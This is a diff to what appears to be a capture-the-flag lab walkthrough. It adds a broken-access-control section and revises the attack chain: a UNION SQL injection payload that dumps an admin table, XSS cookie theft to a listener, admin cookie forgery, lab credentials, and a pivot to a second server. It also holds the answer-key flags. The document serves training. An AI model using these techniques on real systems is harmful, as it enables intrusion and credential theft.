@@ -106,15 +106,27 @@ SQL errors are displayed in the browser. The `reports` table has 5 columns.
 ' UNION SELECT 1,username,password,flag,5 FROM admin_users--
 ```
 
-Returns: `monitor` / `M0nit0r2024` + `FLAG{synapse_sqli_creds_dumped}`
+Returns: `FLAG{synapse_sqli_creds_dumped}` — **FLAG #1** plus credentials in the flag column.
 
-## Attack chain summary
+## Vulnerability 4 — Admin Panel (Broken Access Control)
+
+After forging the admin cookie, navigate to `/admin` — only accessible to users with `role=admin`.
+
+The admin panel queries the `classified_intel` table and displays classified intelligence posts. One entry contains:
+
+- **FLAG{synapse_admin_classified_accessed}** — **FLAG #2**
+- Server-B DataVault credentials: `operator / D4t4V4ult#2024`
+
+**Exploit** — with admin cookie active, browse to `/admin`.
+
+## Attack chain summary (Server-A)
 
 ```
 1. POST XSS payload to /comments
-2. Wait ~20s → victim cookie arrives on listener
-3. Forge admin cookie (broken auth) → access /portal and /search
-4. UNION SQLi on /search → dump admin_users
-5. SSH to Server-B: ssh monitor@192.168.30.x (password: M0nit0r2024)
-6. Execute CMDi on Server-B → final flag
+2. Wait ~20s -> victim cookie arrives on listener (python3 -m http.server 8000)
+3. Forge admin cookie (broken auth) -> access /portal and /search
+4. UNION SQLi on /search -> FLAG{synapse_sqli_creds_dumped} (FLAG #1)
+5. Browse /admin -> FLAG{synapse_admin_classified_accessed} (FLAG #2)
+              -> Obtain: operator / D4t4V4ult#2024 (Server-B DataVault)
+6. Continue to Server-B DataVault -> YAML deserialization -> FLAG #3
 ```
